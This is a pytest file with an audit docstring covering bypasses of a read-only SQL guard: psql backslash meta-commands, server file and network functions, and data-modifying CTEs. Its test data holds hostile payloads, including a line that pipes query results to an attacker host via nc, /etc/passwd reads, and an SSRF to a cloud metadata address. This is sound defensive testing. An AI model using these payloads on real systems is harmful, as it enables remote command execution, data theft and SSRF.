"""Three ways a read-only query still reached something it must not (audit 2026-09-09).

All three share a shape: `SafetyGuard` was written against *the SQL engine* and the thing
on the other end of the string is not always one.

**SQL-01 — the executor is psql, not Postgres.** In SSH-exec mode the query is piped to
`psql` on stdin, and psql processes backslash meta-commands from stdin exactly as it does
interactively: `\\!` runs a shell command, `\\copy … TO PROGRAM` runs one, `\\i`/`\\o` read
and write files. The guard's allow-list inspects the first token and its denylists are SQL
keyword regexes; none of them know that `\\` introduces a command for the client the
connector actually feeds. Reachable by a project **viewer** through a saved note
(`notes.py:97,111`) on any `ssh_exec_mode` connection — remote command execution on the
customer's bastion, which is the host that holds the SSH key.

**SQL-11 — a SELECT can read the filesystem and make requests.** `pg_read_file('/etc/passwd')`,
`pg_ls_dir('/')`, `lo_import(…)`, MySQL `LOAD_FILE(…)`, ClickHouse `file(…)` and `url(…)`
are all SELECTs, so the leading-token allow-list passes them and the DML denylist never
fires. A DB-enforced read-only session does not block a read, so on this class the regex is
the only layer there is. The ClickHouse `url()` case is SSRF needing no file privilege at
all.

**SQL-12 — the DML denylist could not see past a space.** `DML_PATTERNS_SQL`'s UPDATE regex
is `\\b(UPDATE)\\s+[\\w."'`]+…\\s+SET\\b`, which cannot span the space inside a quoted
identifier, so `WITH t AS (UPDATE "my table" SET x=1 RETURNING id) SELECT * FROM t` passed.
On native connectors the engine's read-only session still refuses it; on ssh-exec, which has
no engine layer (SQL-02), the UPDATE runs.

Every check here reads the query with comments **and string literals** blanked
(`strip_sql_comments_and_literals`), so a payload cannot hide inside a literal and an
ordinary literal that happens to contain `\\` or `pg_read_file` is not a false refusal.
"""

from __future__ import annotations

import pytest

from app.core.safety import SafetyGuard, SafetyLevel


def _ro(query: str, db_type: str = "postgres"):
    return SafetyGuard(SafetyLevel.READ_ONLY).validate(query, db_type)


class TestClientMetaCommandsAreRefused:
    """SQL-01. Each payload was measured returning `is_safe=True` before this change."""

    @pytest.mark.parametrize(
        "payload",
        [
            "SELECT 1\n\\! id > /tmp/pwned",
            "SELECT 1 \\copy users TO PROGRAM 'id'",
            "SELECT 1\n\\o /tmp/out",
            "select\n\\i /etc/passwd",
            "SELECT * FROM users\n\\g | nc attacker 4444",
            "SELECT 1\n   \\! whoami",  # indented — the introducer is the first non-space
        ],
    )
    def test_a_backslash_introducer_is_blocked(self, payload: str) -> None:
        result = _ro(payload)
        assert not result.is_safe, (
            "a psql client meta-command passed the guard; piped to psql stdin this is "
            "command execution on the bastion host"
        )

    def test_the_refusal_names_the_reason(self) -> None:
        assert "meta-command" in _ro("SELECT 1\n\\! id").reason.lower()

    def test_it_is_blocked_even_when_dml_is_allowed(self) -> None:
        """`\\!` is shell execution, not SQL. The DML level is about SQL."""
        assert (
            not SafetyGuard(SafetyLevel.ALLOW_DML).validate("SELECT 1\n\\! id", "postgres").is_safe
        )

    def test_a_backslash_inside_a_literal_is_not_a_refusal(self) -> None:
        """A Windows path in a WHERE clause is ordinary SQL, and this guard must not eat it."""
        assert _ro("SELECT * FROM logs WHERE path = 'C:\\temp\\x'").is_safe

    def test_a_backslash_that_does_not_start_a_line_is_not_a_refusal(self) -> None:
        """psql only treats `\\` as an introducer at the start of a line it reads."""
        assert _ro("SELECT 'a' || E'\\n' AS x").is_safe


class TestServerSideFileAndNetworkFunctions:
    """SQL-11. All of these are SELECTs, so nothing else in the guard looks at them."""

    @pytest.mark.parametrize(
        ("payload", "db_type"),
        [
            ("SELECT pg_read_file('/etc/passwd')", "postgres"),
            ("SELECT pg_read_binary_file('/etc/passwd')", "postgres"),
            ("SELECT pg_ls_dir('/')", "postgres"),
            ("SELECT lo_import('/etc/passwd')", "postgres"),
            ("SELECT lo_export(1, '/tmp/x')", "postgres"),
            ("SELECT LOAD_FILE('/etc/passwd')", "mysql"),
            ("SELECT * FROM file('/etc/passwd', 'CSV')", "clickhouse"),
            ("SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'CSV')", "clickhouse"),
        ],
    )
    def test_the_function_is_blocked(self, payload: str, db_type: str) -> None:
        assert not _ro(payload, db_type).is_safe, (
            "a read-only SELECT reached the server's filesystem or the network"
        )

    def test_an_ordinary_query_naming_a_file_column_still_passes(self) -> None:
        """The check is on a call, not on a word: `file` is a perfectly good column name."""
        assert _ro("SELECT file, url FROM downloads WHERE file IS NOT NULL", "clickhouse").is_safe

    def test_a_literal_mentioning_the_function_is_not_a_refusal(self) -> None:
        assert _ro("SELECT * FROM docs WHERE body = 'pg_read_file(x)'").is_safe


class TestDataModifyingCtes:
    """SQL-12. The denylist anchored on a table-name regex; a space defeated it."""

    @pytest.mark.parametrize(
        "payload",
        [
            'WITH t AS (UPDATE "my table" SET x=1 RETURNING id) SELECT * FROM t',
            'WITH t AS (UPDATE public."my table" SET x=1 RETURNING id) SELECT * FROM t',
            "WITH t AS (DELETE FROM users RETURNING id) SELECT * FROM t",
            "WITH t AS (INSERT INTO users (a) VALUES (1) RETURNING id) SELECT * FROM t",
            'WITH a AS (SELECT 1), b AS (UPDATE "two words" SET x=1 RETURNING 1) SELECT * FROM b',
        ],
    )
    def test_a_writing_cte_is_blocked(self, payload: str) -> None:
        assert not _ro(payload).is_safe, "a data-modifying CTE passed the read-only guard"

    def test_a_reading_cte_still_passes(self) -> None:
        assert _ro("WITH t AS (SELECT 1 AS x) SELECT * FROM t").is_safe

    def test_a_subquery_in_parentheses_still_passes(self) -> None:
        assert _ro("SELECT * FROM users WHERE id IN (SELECT user_id FROM orders)").is_safe

    def test_the_plain_top_level_update_is_still_blocked(self) -> None:
        """The old patterns stay as defence in depth; this asserts they did not go away."""
        assert not _ro("UPDATE users SET x = 1").is_safe
